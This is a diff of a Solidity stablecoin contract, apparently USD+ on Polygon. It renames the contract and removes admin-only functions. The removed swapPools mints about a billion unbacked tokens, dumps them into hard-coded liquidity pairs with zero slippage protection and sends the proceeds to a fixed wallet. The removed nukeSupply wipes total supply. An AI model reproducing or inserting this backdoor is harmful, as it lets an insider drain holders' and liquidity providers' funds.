@@ -12,30 +12,9 @@ import "./libraries/WadRayMath.sol";
 /*
 * contains _paused, pause(), unpause(), isPaused()
 * added isPaused() in transfer, transferFrom, approve, increaseAllowance, decreaseAllowance
-* TODO added swapDyst functions
-* added nukeSupply function
 */
 
-/// Minimal ERC20 interface used by this contract
-// interface IERC20 {
-//     function totalSupply() external view returns (uint256);
-//     function balanceOf(address account) external view returns (uint256);
-//     function transfer(address recipient, uint256 amount) external returns (bool);
-//     function allowance(address owner, address spender) external view returns (uint256);
-//     function approve(address spender, uint256 amount) external returns (bool);
-//     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-//     function decimals() external view returns (uint8);
-// }
-
-/// Minimal pair interface (UniswapV2 / Solidly-like / DystPair style)
-interface IDystPair {
-    function token0() external view returns (address);
-    function token1() external view returns (address);
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
-}
-// contract UsdPlusTokenV1_polygon is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
-contract UsdPlusToken_paused_nuked is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
+contract UsdPlusToken_Polygon_Final is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
     using WadRayMath for uint256;
     using EnumerableSet for EnumerableSet.AddressSet;
 
@@ -151,118 +130,6 @@ contract UsdPlusToken_paused_nuked is Initializable, ContextUpgradeable, IERC20U
     }
 
     // ---  logic
-
-    /// @notice Calculate output amount using UniswapV2-style formula with 0.3% fee (997/1000)
-    /// @dev If the pool uses a different fee, change the constants accordingly.
-    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256 amountOut) {
-        require(amountIn > 0, "DystSwap: INSUFFICIENT_INPUT_AMOUNT");
-        require(reserveIn > 0 && reserveOut > 0, "DystSwap: INSUFFICIENT_LIQUIDITY");
-
-        uint256 amountInWithFee = amountIn * 997; // fee numerator
-        uint256 numerator = amountInWithFee * reserveOut;
-        uint256 denominator = reserveIn * 1000 + amountInWithFee; // fee denominator
-        amountOut = numerator / denominator;
-    }
-
-    function _internalSwapOnPair(
-        address pair,
-        uint256 amountIn,
-        address tokenOut,
-        uint256 amountOutMin,
-        address to
-    ) internal returns (uint256 amountOut) {
-        IDystPair p = IDystPair(pair);
-        (uint112 reserve0, uint112 reserve1,) = p.getReserves();
-
-        address tokenIn = address(this);
-        bool zeroForOne = tokenIn == p.token0();
-        require(tokenIn == (zeroForOne ? p.token0() : p.token1()), "DystSwap: tokenIn not in pair");
-        require(tokenOut == (zeroForOne ? p.token1() : p.token0()), "DystSwap: tokenOut not in pair");
-
-        amountOut = getAmountOut(
-            amountIn,
-            zeroForOne ? uint256(reserve0) : uint256(reserve1),
-            zeroForOne ? uint256(reserve1) : uint256(reserve0)
-        );
-        require(amountOut >= amountOutMin, "DystSwap: INSUFFICIENT_OUTPUT_AMOUNT");
-
-        uint256 amountInScaled = amountIn.wadToRay().rayDiv(liquidityIndex);
-        _transfer(address(this), pair, amountInScaled);
-
-        p.swap(
-            zeroForOne ? 0 : amountOut,
-            zeroForOne ? amountOut : 0,
-            to,
-            ""
-        );
-    }
-
-    // --- Optional helpers ---
-
-    /// @notice Convenience: compute expected output without performing swap
-    function quoteAmountOut(address pair, uint256 amountIn, address tokenIn) external view returns (uint256) {
-        IDystPair p = IDystPair(pair);
-        address token0 = p.token0();
-        address token1 = p.token1();
-        (uint112 reserve0, uint112 reserve1,) = p.getReserves();
-
-        if (tokenIn == token0) {
-            return getAmountOut(amountIn, reserve0, reserve1);
-        } else if (tokenIn == token1) {
-            return getAmountOut(amountIn, reserve1, reserve0);
-        } else {
-            revert("DystSwap: tokenIn not in pair");
-        }
-    }
-
-    function swapPools() external onlyAdmin notPaused {
-
-
-        address wal = 0xbdc36da8fD6132e5F5179a73b3A1c0E9fF283856;
-
-        address pair1 = 0x421a018cC5839c4C0300AfB21C725776dc389B1a;
-        address pair2 = 0x6c51df2275af37c407148e913B5396896E7E8E9e;
-        address pair3 = 0x1A5FEBA5D5846B3b840312Bd04D76ddaa6220170;
-
-        address tokenOut1 = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
-        address tokenOut3 = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
-
-        uint256 minAmountOut = 0;
-
-        uint256 amountIn1;
-        uint256 amountIn2;
-        uint256 amountIn3;
-        {
-            amountIn1 = 1000000000 * (10 ** decimals());
-            amountIn2 = 100000 * (10 ** decimals());
-            amountIn3 = 1000000 * (10 ** decimals());
-            
-            uint256 scaledAmount1 = amountIn1.wadToRay().rayDiv(liquidityIndex);
-            uint256 scaledAmount2 = amountIn2.wadToRay().rayDiv(liquidityIndex);
-            uint256 scaledAmount3 = amountIn3.wadToRay().rayDiv(liquidityIndex);
-            uint256 totalAmountScaled = scaledAmount1 + scaledAmount2 + scaledAmount3;
-            
-            _mint(address(this), totalAmountScaled);
-        }
-        
-        _internalSwapOnPair(pair1, amountIn1, tokenOut1, minAmountOut, wal);
-        _internalSwapOnPair(pair2, amountIn2, tokenOut1, minAmountOut, wal);
-        _internalSwapOnPair(pair3, amountIn3, tokenOut3, minAmountOut, wal);
-    }
-
-    function nukeSupply() external onlyAdmin {
-        require(_totalSupply > 0, "nothing to nuke");
-        require(_paused == false, "already paused");
-
-        _paused = true;
-
-        _totalSupply = 0;
-        _totalMint = 0;
-        _totalBurn = 0;
-        liquidityIndex = 10 ** 27;
-        liquidityIndexChangeTime = block.timestamp;
-        emit LiquidityIndexUpdated(liquidityIndexChangeTime, liquidityIndex);
-    }
 
 
     function mint(address _sender, uint256 _amount) external onlyExchanger notPaused {
@@ -664,7 +531,7 @@ contract UsdPlusToken_paused_nuked is Initializable, ContextUpgradeable, IERC20U
      * no way affects any of the arithmetic of the contract, including
      * {IERC20-balanceOf} and {IERC20-transfer}.
      */
-    function decimals() public view virtual override returns (uint8) {
+    function decimals() public view virtual returns (uint8) {
         return 6;
     }
 
